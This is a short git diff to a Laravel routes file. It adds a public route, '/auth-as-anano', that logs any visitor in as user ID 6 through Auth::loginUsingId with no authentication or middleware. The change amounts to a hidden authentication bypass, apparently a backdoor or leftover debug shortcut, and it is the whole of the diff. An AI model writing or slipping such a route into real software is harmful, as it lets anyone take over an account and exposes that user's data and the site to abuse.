@@ -29,6 +29,13 @@ use Illuminate\Support\Facades\Route;
 use Livewire\Livewire;
 use Mcamara\LaravelLocalization\Facades\LaravelLocalization;
 
+use Auth;
+
+
+Route::get('/auth-as-anano', function(){
+    Auth::loginUsingId(6);
+});
+
 Route::group([
     'prefix' => LaravelLocalization::setLocale(),
     'middleware' => ['localeSessionRedirect', 'localizationRedirect'],
